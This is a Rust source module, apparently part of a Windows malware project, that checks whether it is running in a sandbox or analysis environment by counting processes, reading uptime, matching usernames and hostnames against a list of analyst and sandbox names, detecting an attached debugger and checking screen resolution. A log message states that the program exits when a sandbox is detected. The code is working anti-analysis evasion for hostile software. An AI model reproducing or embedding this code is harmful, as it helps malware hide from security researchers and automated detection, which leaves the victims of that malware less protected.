//! Sandbox / analysis-environment detection.

#[cfg(target_os = "windows")]
pub fn is_sandbox() -> bool {
    let proc   = check_process_count();
    crate::dbg_log!("  sandbox: process_count  => {proc} (true = too few processes, looks like sandbox)");
    let uptime = check_uptime();
    crate::dbg_log!("  sandbox: uptime         => {uptime} (true = booted < 5min ago)");
    let artifacts = check_known_bad_artifacts();
    crate::dbg_log!("  sandbox: bad_artifacts  => {artifacts} (true = hostname/username matches sandbox pattern)");
    let debugger = check_debugger();
    crate::dbg_log!("  sandbox: debugger       => {debugger} (true = debugger attached)");
    let screen = check_screen_res();
    crate::dbg_log!("  sandbox: screen_res     => {screen} (true = resolution < 800x600)");

    let result = proc || uptime || artifacts || debugger || screen;
    crate::dbg_log!("  sandbox: VERDICT        => {result} (true = sandbox detected, will exit)");
    result
}

#[cfg(not(target_os = "windows"))]
pub fn is_sandbox() -> bool { false }

#[cfg(target_os = "windows")]
fn check_process_count() -> bool {
    use windows_sys::Win32::{
        Foundation::INVALID_HANDLE_VALUE,
        System::Diagnostics::ToolHelp::{
            CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
            PROCESSENTRY32W, TH32CS_SNAPPROCESS,
        },
    };
    unsafe {
        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snap == INVALID_HANDLE_VALUE { return false; }
        let mut entry = PROCESSENTRY32W {
            dwSize: std::mem::size_of::<PROCESSENTRY32W>() as u32,
            ..std::mem::zeroed()
        };
        let mut count = 0u32;
        if Process32FirstW(snap, &mut entry) != 0 {
            count += 1;
            while Process32NextW(snap, &mut entry) != 0 {
                count += 1;
            }
        }
        windows_sys::Win32::Foundation::CloseHandle(snap);
        count < 50
    }
}

#[cfg(target_os = "windows")]
fn check_uptime() -> bool {
    use windows_sys::Win32::System::SystemInformation::GetTickCount64;
    unsafe { GetTickCount64() < 5 * 60 * 1000 }
}

#[cfg(target_os = "windows")]
fn check_known_bad_artifacts() -> bool {
    let bad_users = ["sandbox", "malware", "virus", "john doe",
                     "analyst", "triage", "cuckoo", "vmware", "dummy"];
    let bad_hosts = ["sandbox", "malware", "cuckoo", "analysis",
                     "virus", "win7x64", "john-pc", "desktop-"];

    let user = std::env::var("USERNAME").unwrap_or_default().to_lowercase();
    let host = std::env::var("COMPUTERNAME").unwrap_or_default().to_lowercase();

    for b in &bad_users { if user.contains(b) { return true; } }
    for b in &bad_hosts { if host.contains(b) { return true; } }
    false
}

#[cfg(target_os = "windows")]
fn check_debugger() -> bool {
    use windows_sys::Win32::System::Diagnostics::Debug::IsDebuggerPresent;
    unsafe { IsDebuggerPresent() != 0 }
}

#[cfg(target_os = "windows")]
fn check_screen_res() -> bool {
    use windows_sys::Win32::UI::WindowsAndMessaging::{GetSystemMetrics, SM_CXSCREEN, SM_CYSCREEN};
    unsafe {
        let w = GetSystemMetrics(SM_CXSCREEN);
        let h = GetSystemMetrics(SM_CYSCREEN);
        // Sandboxes often run at < 800x600
        w < 800 || h < 600
    }
}
